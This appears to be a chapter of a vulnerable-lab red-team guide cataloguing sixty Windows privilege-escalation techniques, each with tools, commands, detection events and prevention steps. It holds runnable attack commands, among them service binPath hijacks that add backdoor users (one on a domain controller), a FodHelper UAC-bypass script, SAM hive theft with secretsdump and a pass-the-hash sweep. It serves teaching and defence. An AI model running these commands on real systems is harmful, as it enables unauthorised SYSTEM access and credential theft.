# 05 — Privilege Escalation (PE-001..060)

Local privilege escalation on Windows. Most paths here assume you have *something* (a low-priv shell, a domain user on a workstation, or a service account on a server). The goal is SYSTEM.

Run `winPEAS` and `SharpUp` first — they enumerate 80% of these mechanically.

---

### PE-001 — SeImpersonatePrivilege → Potato suite
**What it is:** any process holding `SeImpersonatePrivilege` can be tricked into authenticating to a local malicious "RPC" listener; the resulting impersonation token is SYSTEM.
**Why it works here:** IIS AppPool / SQL Service run as Network Service or service accounts with SeImpersonate.
**Tools:** `PrintSpoofer`, `GodPotato`, `JuicyPotato`, `SweetPotato`, `RoguePotato`, `RemotePotato0`, `EfsPotato`, `LocalPotato`.
**Steps:**
```cmd
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami > C:\Temp\o.txt"
```
**Detection:** Sysmon `1` child process of `w3wp.exe`/`sqlservr.exe` spawning `cmd.exe`/`powershell.exe`; named-pipe creation by service accounts.
**Prevention:** remove `SeImpersonate` from service accounts where possible; run AppPool as Managed Service Account; ASR rules.

---

### PE-002 — SeAssignPrimaryTokenPrivilege
**What it is:** lets you use `CreateProcessAsUserW` with any token — chain with token impersonation for SYSTEM.
**Tools:** `FullPowers`, custom PoC.
**Detection:** Event `4673` for the privilege used by non-system context.
**Prevention:** don't grant; tier services.

---

### PE-003 — SeTcbPrivilege
**What it is:** "act as part of the operating system" — virtually a SYSTEM-equivalent privilege. Trivial escalation.
**Detection:** `4673` for SeTcb.
**Prevention:** never grant outside `LocalSystem`.

---

### PE-004 — SeLoadDriverPrivilege
**What it is:** load a kernel driver. Chain with a signed-but-vulnerable driver (Capcom.sys, HEVD, RTCore64.sys) for kernel SYSTEM.
**Tools:** `Capcom-Rootkit`, `KDU`, `EOPLOAD`, `KDMapper`.
**Detection:** Event `7045`/`6` (kernel-mode load) of unsigned/known-vulnerable drivers; HVCI mitigations.
**Prevention:** enable HVCI; Microsoft Vulnerable Driver Block List; Smart App Control.

---

### PE-005 — SeBackupPrivilege → File Read Bypass
**What it is:** read any file ignoring DACLs; combined with `robocopy /B` or `wbadmin` to extract SAM/SECURITY/NTDS.
**Tools:** `robocopy /B`, `diskshadow`, `secretsdump`.
**Steps:** see CRED-039.
**Detection:** `4673` for SeBackupPrivilege used to access sensitive hives.
**Prevention:** tier Backup Operators; require backup software to use dedicated service accounts.

---

### PE-006 — SeRestorePrivilege → File Write Bypass
**What it is:** counterpart to SeBackup; write any file ignoring DACLs. Plant a payload in `C:\Windows\System32\`.
**Tools:** `robocopy /B`, `xcopy /O`.
**Detection:** Event `4663` writing to protected system folders.
**Prevention:** same as PE-005.

---

### PE-007 — Unquoted Service Path
**What it is:** service binPath `C:\Program Files\Vuln Co\service.exe` (unquoted, with spaces) — Windows tries `C:\Program.exe`, `C:\Program Files\Vuln.exe`, etc., in order. Write any of those = service runs your binary.
**Why it works here:** `VulnService` is deliberately registered unquoted.
**Tools:** `winPEAS`, `wmic service`, `SharpUp`.
**Steps:**
```cmd
wmic service get name,pathname,startname,startmode | findstr /i "auto" | findstr /v /i "C:\"
copy beacon.exe "C:\Program Files\Vuln.exe"
sc start VulnService
```
**Detection:** Sysmon `7045`, file create in suspicious path.
**Prevention:** always quote service binPaths.

---

### PE-008 — Weak Service DACL
**What it is:** ACL on a service allows non-admins `SERVICE_CHANGE_CONFIG`. `sc config <svc> binPath= "cmd /c ..."`, restart, SYSTEM.
**Tools:** `winPEAS`, `accesschk`, `sc config`.
**Steps:**
```cmd
accesschk.exe -uwcqv "Authenticated Users" *
sc config VulnSvc binPath= "cmd /c net user attacker P@ss /add"
sc start VulnSvc
```
**Detection:** Event `7040`.
**Prevention:** harden service DACLs; remove `Authenticated Users`/`Users` from change-config rights.

---

### PE-009 — DLL Hijacking
**What it is:** missing DLL in the app's search path → drop a DLL with that name in a writable directory earlier in the search order → loaded into the privileged process.
**Tools:** `Process Monitor` (filter NAME NOT FOUND), `winPEAS`.
**Detection:** Sysmon `7` DLL loaded from unusual path.
**Prevention:** `SafeDllSearchMode=1`; signed-only loading; Smart App Control.

---

### PE-010 — PATH Hijacking
**What it is:** writable directory earlier in `%PATH%` than the resolved program → drop `cmd.exe`/`net.exe` and any admin invocation picks yours.
**Tools:** `winPEAS`, `echo %path%`.
**Detection:** new executables in PATH directories.
**Prevention:** sanitize PATH; no writable dirs before system dirs.

---

### PE-011 — AlwaysInstallElevated
**What it is:** HKLM + HKCU `AlwaysInstallElevated=1` → any MSI runs as SYSTEM.
**Why it works here:** policy set deliberately.
**Tools:** `msfvenom -f msi`, `msiexec /i payload.msi`.
**Steps:**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
msiexec /quiet /qn /i payload.msi
```
**Detection:** Sysmon `1` `msiexec.exe` parented by user shell spawning `cmd.exe`.
**Prevention:** GPO disable `AlwaysInstallElevated`.

---

### PE-012 — UAC Bypass (FodHelper / ComputerDefaults / sdclt)
**What it is:** auto-elevated binaries read user-controlled registry keys to launch helper apps. Plant `cmd` into `HKCU\Software\Classes\ms-settings\Shell\Open\Command` → trigger fodhelper → elevated cmd.
**Tools:** `UACME`, `Invoke-FodhelperUACBypass`.
**Steps:**
```powershell
$rkey = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Force -Path $rkey
Set-ItemProperty -Path $rkey -Name '(default)' -Value 'cmd /c start cmd'
Set-ItemProperty -Path $rkey -Name 'DelegateExecute' -Value ''
Start-Process "C:\Windows\System32\fodhelper.exe"
```
**Detection:** Sysmon `13` HKCU registry write to `ms-settings\shell\open\command`.
**Prevention:** UAC = Always Notify; remove user from local Administrators (medium-IL boundary).

---

### PE-013 — Token Kidnapping (churrasco)
**What it is:** classic Potato variant; effectively obsolete since 2017 mitigation but lab-injected for completeness.
**Tools:** `churrasco.exe`.
**Detection / Prevention:** PE-001.

---

### PE-014 — Named Pipe Impersonation
**What it is:** any service with SeImpersonate that connects to your named pipe → impersonate → SYSTEM.
**Tools:** `PrintSpoofer`, custom pipe servers.
**Steps / Detection / Prevention:** PE-001.

---

### PE-015 — Service binary overwrite
**What it is:** writable service binary; replace + restart.
**Tools:** `icacls`, `sc`.
**Steps:**
```cmd
icacls "C:\Program Files\App\app.exe"   :: check write rights
copy beacon.exe "C:\Program Files\App\app.exe"
sc start App
```
**Detection:** Event `7040`/file modification of binary path.
**Prevention:** correct file DACLs; signed-only services.

---

### PE-016 — Task Scheduler XML Race
**What it is:** `%SystemRoot%\System32\Tasks\<task>` XML file is writable by Users → edit Command → next run → SYSTEM.
**Tools:** `accesschk -uwd`.
**Detection:** Event `4698` for task modification.
**Prevention:** tighten Task folder DACL.

---

### PE-017 — COM Object Hijacking (PrintNotify)
**What it is:** PrintNotify COM service implements SeImpersonate-bearing helpers — pipe trick like Potato.
**Tools:** `PrintNotifyPotato.exe`.
**Detection / Prevention:** PE-001.

---

### PE-018 — Insecure SYSVOL GPO
**What it is:** GPO `\\corp.local\sysvol\...\Scripts\Startup` writable by Authenticated Users → drop your script → next reboot → SYSTEM.
**Why it works here:** loose SYSVOL ACLs on a deliberately-misconfigured GPO.
**Tools:** `SharpGPOAbuse`, `New-GPOImmediateTask`.
**Steps:**
```powershell
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName a.bat --ScriptContents "net user evil P@ss /add" --GPOName VulnGPO
```
**Detection:** Event `5136` GPO edit; SYSVOL file create from non-admin.
**Prevention:** SYSVOL ACL audit; GPO delegation least-privilege.

---

### PE-019 — Backup Operators → modify GPO files / flag files
**What it is:** BO has read on system files (PE-005) and write on GPO via inherited rights → modify scripts to run as SYSTEM.
**Detection / Prevention:** PE-005 + PE-018.

---

### PE-020 — SeChangeNotifyPrivilege
**What it is:** traverse-check bypass. Not directly an escalation but enables read of folders you can't list. Combined with file content secrets.
**Detection:** difficult.
**Prevention:** least privilege.

---

### PE-021 — SeIncreaseQuotaPrivilege
**What it is:** create new AD object or modify resource quotas. Indirectly useful.
**Detection / Prevention:** rare; restrict.

---

### PE-022 — Scheduled `.job` overwrite
**What it is:** legacy `.job` files (XP-era) — write to `%windir%\Tasks` triggers next run.
**Detection:** Sysmon `11`.
**Prevention:** tighten `%windir%\Tasks` ACL.

---

### PE-023 — Startup folder persistence/escalation
**What it is:** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` writable by Domain Users → next admin logon = SYSTEM exec.
**Detection:** Sysmon `11` file creation.
**Prevention:** ACL hardening on `All Users Startup`.

---

### PE-024 — HiveNightmare / SeriousSAM (CVE-2021-36934)
**What it is:** BUILTIN\Users can read VSS snapshots of `SAM`/`SECURITY`/`SYSTEM`. Read = secretsdump = local admin.
**Tools:** `HiveNightmare`, `vssadmin`.
**Steps:**
```cmd
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM C:\Temp\
```
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
**Detection:** Event `4663` access to shadow-copy SAM by non-admin.
**Prevention:** patch (KB5005033+); `icacls C:\Windows\System32\config\*.* /inheritance:e`.

---

### PE-025 — Token Privilege Exploitation Suite
**What it is:** custom binary that demonstrates each token privilege’s escalation path (umbrella ID).
**Tools:** PoC binaries.
**Detection / Prevention:** as per individual privileges above.

---

### PE-026 — SeManageVolumePrivilege + Junctions
**What it is:** combined with junctions → take ownership / write protected paths.
**Tools:** `SeManageVolumeExploit`.
**Detection:** Sysmon `1` for `vds.exe` invoked oddly.
**Prevention:** restrict the privilege.

---

### PE-027 — SeCreateSymbolicLinkPrivilege
**What it is:** create symlinks → redirect privileged file ops to attacker-controlled targets.
**Detection:** Sysmon `15` (file stream).
**Prevention:** privilege normally only granted to admins; keep it that way.

---

### PE-028 — SeDebugPrivilege → LSASS token steal
**What it is:** open LSASS, list tokens, impersonate SYSTEM.
**Tools:** `mimikatz token::elevate`.
**Detection:** Sysmon `10` LSASS access.
**Prevention:** Credential Guard.

---

### PE-029 — SeTakeOwnershipPrivilege
**What it is:** take ownership of any object; grant yourself GenericAll; modify.
**Detection:** Event `4670` (permissions changed).
**Prevention:** restrict; tier admin.

---

### PE-030 — Service binary replacement
**What it is:** PE-008/PE-015 variant — focuses on file write rather than ACL change.

---

### PE-031 — Follina (CVE-2022-30190)
**What it is:** MSDT protocol handler in a Word doc spawns ms-msdt → arbitrary code in user context.
**Tools:** msdt.dll variant or `mspaint`-style PoC.
**Detection:** Sysmon `1` `msdt.exe` child of `winword.exe`.
**Prevention:** patch June 2022; disable MSDT URL protocol (`reg delete HKCR\ms-msdt`).

---

### PE-032 — WordPad RCE (CVE-2023-21716)
**What it is:** RTF parser heap corruption.
**Tools:** PoC RTF.
**Detection:** Sysmon `1` `wordpad.exe` spawning unusual children.
**Prevention:** patch; remove WordPad (deprecated Windows 11 23H2+).

---

### PE-033 — CLFS EoP (CVE-2023-28252)
**What it is:** CLFS driver bug exploited in the wild by ransomware groups.
**Tools:** public PoC.
**Detection:** EDR signature.
**Prevention:** patch April 2023 cumulative.

---

### PE-034 — AFD.sys (CVE-2023-36745)
**What it is:** Ancillary Function Driver kernel LPE.
**Prevention:** patch.

---

### PE-035 — TrustedInstaller LPE (CVE-2023-29360)
**Prevention:** patch.

---

### PE-036 — Windows LPEs 2024 (CVE-2024-2067x)
**Prevention:** patch.

---

### PE-037 — CSC Service LPE (CVE-2024-26229)
**Prevention:** patch.

---

### PE-038 — DWM Core Library LPE (CVE-2024-30051)
**Prevention:** patch.

---

### PE-039 — TCP/IP IPv6 (CVE-2024-38063)
**What it is:** RCE in IPv6 packet processing; can be chained to LPE.
**Prevention:** patch August 2024; disable IPv6 if unused.

---

### PE-040 — 2025 LPE placeholder
Track Patch Tuesday.

---

### PE-041 — Modifiable Service Path Folder
**What it is:** Service binary lives in a folder you can write to → drop DLL/exe.
**Detection / Prevention:** PE-008.

---

### PE-042 — Modifiable Service Registry Key
**What it is:** `ImagePath` registry value writable → point to your binary.
**Detection:** Event `4657` registry value change.
**Prevention:** lock down service registry keys.

---

### PE-043 — StorSvc LOLBAS
**What it is:** Storage Service abuse for impersonation. PE-001 variant.

---

### PE-044 — CDPSvc abuse
**What it is:** Connected Devices Platform Service runs as SYSTEM; named-pipe abuse.
**Tools:** `CDPSvc-PoC`.
**Detection:** Sysmon `1` from `svchost.exe -k LocalService`.
**Prevention:** disable CDPSvc if unused.

---

### PE-045 — Perfmon Help Key
**What it is:** old trick — F1 on a privileged perfmon spawns help in user context, which can pivot.
**Mostly obsolete on modern Windows.**

---

### PE-046 — Point-and-Print EoP (CVE-2022-38047)
**Prevention:** patch; `RestrictDriverInstallationToAdministrators=1`.

---

### PE-047 — CVE-2022-446xx LPEs
**Prevention:** patch.

---

### PE-048 — Kerberos S4U2Self LPE (CVE-2022-33647)
**What it is:** S4U2Self over-permissive — service can S4U for any user, get TGS, escalate.
**Prevention:** patch.

---

### PE-049 — Vulnerable Signed Driver (RTCore64)
**What it is:** Bring-your-own-driver. Load `RTCore64.sys` (MSI Afterburner) — it has kernel R/W primitives via IOCTL → patch token / disable callbacks.
**Tools:** `KDU`, `EOPLOAD`, `RealBlindingEDR`.
**Detection:** unsigned-driver-load events; HVCI; Microsoft Vulnerable Driver Block List.
**Prevention:** enable Microsoft Vulnerable Driver Block List; HVCI/VBS.

---

### PE-050 — MSI Repair Mode
**What it is:** `msiexec /fa` repair → custom action runs as SYSTEM → spawn cmd.
**Tools:** `msiexec /fa`, custom MSI.
**Detection:** Sysmon `1` `msiexec.exe` spawning `cmd.exe`.
**Prevention:** restrict who can repair MSIs; AppLocker.

---

### PE-051 — KrbRelayUp
See LAT-026.

---

### PE-052 — Potato Suite (consolidated)
See PE-001.

---

### PE-053 — CertPotato (ADCS-based SYSTEM via S4U)
**What it is:** service account with SeImpersonate + ADCS reachable → request machine cert → cert auth → S4U → SYSTEM. ADCS variant of GodPotato.
**Tools:** `CertPotato.exe`.
**Detection:** ADCS Event `4886` with machine cert request from service account; Sysmon LSASS access.
**Prevention:** restrict Machine template enrollment; PE-001 mitigations.

---

### PE-054 — NetExec local-auth admin sweep
**What it is:** LAPS not deployed → same local admin password reused (golden image). `nxc smb` with `--local-auth -H hash` lights up every host.
**Tools:** `netexec`.
**Steps:**
```bash
nxc smb 10.10.0.0/24 -u Administrator -H :31d6... --local-auth
```
**Detection:** 4624 Logon Type 3 with local Administrator across many hosts.
**Prevention:** LAPS; unique passwords per host.

---

### PE-055 — 2025 LPE placeholder
Track Patch Tuesday.

---

### PE-056 — UAC Bypass via WSReset/DiskCleanup/EventViewer/Cmstp
**What it is:** auto-elevated binaries with user-controllable lookups → registry hijack → elevated cmd.
**Tools:** `UACME`.
**Detection:** Sysmon `13`/`1` for hijack key + spawn.
**Prevention:** UAC = Always Notify; CCG.

---

### PE-057 — Server Operators → SYSTEM on DC
**What it is:** members of Server Operators on a DC can `sc.exe config` any service → next start = SYSTEM. The classic "tier-0-by-accident" group.
**Why it works here:** `helpdesk` in Server Operators on DC01.
**Steps:**
```cmd
sc \\dc01 config NTDS binPath= "cmd /c net user backdoor P@ss /add /domain"
sc \\dc01 stop NTDS
sc \\dc01 start NTDS
```
**Detection:** Event `7040` on DC.
**Prevention:** empty Server Operators on every DC.

---

### PE-058 — Print Operators → SYSTEM on DC
**What it is:** Print Operators can install print drivers → driver = DLL → SYSTEM on DC.
**Prevention:** empty Print Operators on DCs.

---

### PE-059 — Backup Operators on DC → NTDS.dit theft
See CRED-007/CRED-039.

---

### PE-060 — TrustedInstaller → SYSTEM (Tier-0 boundary)
**What it is:** admin can `psexec -i -s -d` from TrustedInstaller token to cross the tier-0 boundary on the local machine (modify protected system files).
**Tools:** `psexec64 -s -i`, mimikatz `token::elevate`.
**Detection:** unusual TrustedInstaller-launched processes (Sysmon `1`).
**Prevention:** no practical fix — admin is admin. Tier-0 isolation.

---

Next: [`06-persistence.md`](06-persistence.md).
